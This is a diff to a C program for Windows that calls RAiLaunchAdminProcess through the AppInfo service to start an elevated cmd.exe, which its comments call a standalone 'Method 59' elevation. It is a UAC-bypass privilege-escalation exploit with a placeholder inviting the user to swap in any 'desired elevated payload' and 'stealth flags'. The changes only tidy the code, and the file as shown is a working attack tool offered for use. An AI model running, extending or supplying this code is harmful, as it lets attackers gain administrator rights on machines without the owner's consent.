@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include <winternl.h>   // Provides NTSTATUS and NT_SUCCESS macro
 
 typedef NTSTATUS(NTAPI* pfnRAiLaunchAdminProcess)(
     LPCWSTR lpApplicationName,
@@ -27,15 +28,15 @@ int main(void) {
         return 1;
     }
 
-    // <<< CHANGE TO YOUR DESIRED ELEVATED PAYLOAD >>>
+    // <<< CHANGE THESE TO YOUR DESIRED ELEVATED PAYLOAD >>>
     LPCWSTR app = L"C:\\Windows\\System32\\cmd.exe";
-    LPCWSTR cmd  = L"/k whoami && echo SUCCESS - Elevated via standalone Method 59 (APPINFO) && pause";
+    LPCWSTR cmd = L"/k whoami && echo SUCCESS - Elevated via standalone Method 59 && pause";
 
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    // Stealth flags often used in 2026 ports
-    DWORD flags = 0x00000001 | 0x00000004;  // Debug + silent variants
+    // Common stealth flags used in 2026 ports
+    DWORD flags = 0x00000005;   // Adjust if needed (debug/silent variants)
 
     NTSTATUS status = RAiLaunchAdminProcess(
         app,
@@ -46,7 +47,7 @@ int main(void) {
         NULL,
         &si,
         &pi,
-        0,      // Session ID
+        0,
         flags);
 
     if (NT_SUCCESS(status)) {
